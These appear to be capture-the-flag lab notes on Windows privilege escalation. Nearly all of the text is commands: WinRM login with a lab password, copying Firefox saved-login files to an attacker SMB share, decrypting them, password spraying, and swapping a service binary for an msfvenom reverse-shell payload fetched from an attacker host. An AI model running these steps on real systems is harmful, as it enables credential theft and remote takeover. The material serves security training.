# EXAMPLE 1
```
evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
Get-ComputerInfo
```
![image](https://user-images.githubusercontent.com/33616880/231686295-621f2f18-be32-4e7e-90af-b0dada0b1254.png)


https://github.com/carlospolop/PEASS-ng/releases
```
upload winPEASx64.exe
./winPEASx64.exe
```
![image](https://user-images.githubusercontent.com/33616880/231686514-0c6ced70-5cf4-48e3-8951-6b9ba81b18e0.png)
![image](https://user-images.githubusercontent.com/33616880/231686548-aa5a6439-c37c-4f74-a300-568f7ac4193a.png)
![image](https://user-images.githubusercontent.com/33616880/231686573-5ded1f6d-582b-41dd-adbd-30e8fa3f7b43.png)


```
./smbserver.py s . -smb2support -username df -password df
cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release
net use \\10.10.14.39\s /u:df df
copy key4.db \\10.10.14.39\s\key4.db
copy logins.json \\10.10.14.39\s\logins.json
```
![image](https://github.com/regarmulia/HTB/assets/33616880/aaf0389b-152c-47c6-b62d-9c679b0e404f)

![image](https://github.com/regarmulia/HTB/assets/33616880/53696ae6-22b4-4e12-8b05-8a600ec7fe8e)


```
git clone https://github.com/lclevy/firepwd.git
python3 firepwd.py
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bef22052-e930-4afc-94b6-3f4e5e765fc8)

![image](https://github.com/regarmulia/HTB/assets/33616880/48c0cfca-63ec-4c03-aaf4-612913049f50)


```
crackmapexec smb 10.10.11.158 -u users3.txt -p pass3.txt
crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0af2564b-a418-496f-8a11-bda32d2a5eb0)

![image](https://github.com/regarmulia/HTB/assets/33616880/6956b962-0e9c-474d-8574-5cffe479247b)



# EXAMPLE 2
# Upload winpeas.exe to enumerate the machine
```
curl http://192.168.49.80/winPEASany_ofs.exe -o winPEASany_ofs.exe
```
winPEASany_ofs.exe

found an unquoted service path vulnerable for "Pipes Printing Service"

```
icacls "C:\Program Files\Pipe Printing Service\PipesPrinting.exe
```

Icacls is a Windows command-line utility that IT admins can use to change access control lists on files and folders.

# Create payload using msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=662 -f exe > shell.exe
```

# Replace the original binary file with payload file and restart the machine
powershell
```
move "C:\Program Files\Pipes Printing Service\PipesPrinting.exe" "C:\Program Files\Pipes Printing Service\PipesPrinting.exe.backup"
```
```
curl http://192.168.49.80/shell.exe -o "C:\Program Files\Pipes Printing Service\PipesPrinting.exe"
```
shutdown /r /t 1

# Receive command shell on 662 port as "nt authority system"
```
nc -vlvvvvp 662
```
```
whoami
cd /users/Administrator/Desktop
type proof.txt
hostname
ipconfig
```
